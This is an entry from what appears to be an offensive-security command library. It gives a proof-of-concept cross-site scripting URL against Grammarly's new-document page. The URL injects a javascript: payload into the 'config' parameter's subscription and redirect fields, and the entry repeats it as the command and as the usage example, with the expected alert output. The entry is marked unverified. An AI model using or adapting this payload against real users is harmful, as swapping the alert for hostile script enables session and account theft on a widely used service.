---
data: >-
  https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
tags:
  - xss
  - poc
  - grammarly
type: command
executor: bash
platforms:
  - Web
id: 436cce68-4100-4f6c-8d7c-9f319f2cc675
created_at: '2025-12-13T23:56:20.270Z'
updated_at: '2025-12-13T23:56:20.270Z'
verified: false
validated: true
submitted: true
---
# grammarly-xss-poc-new-doc

## Command

```bash
https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## Description

PoC URL to inject XSS payload into config for new document creation, overriding account.subscription and api.redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | JSON object overriding account.subscription and api.redirect to javascript:alert | Yes |

## Examples

### Basic Usage

```bash
https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
```

## Expected Output

Triggers alert(document.domain) when interacting with subscription or upgrade features.

## Related

- [[procedures/Craft-PoC-URLs-for-Config-Injection]]
- [[procedures/Trigger-XSS-via-Affected-Features]]
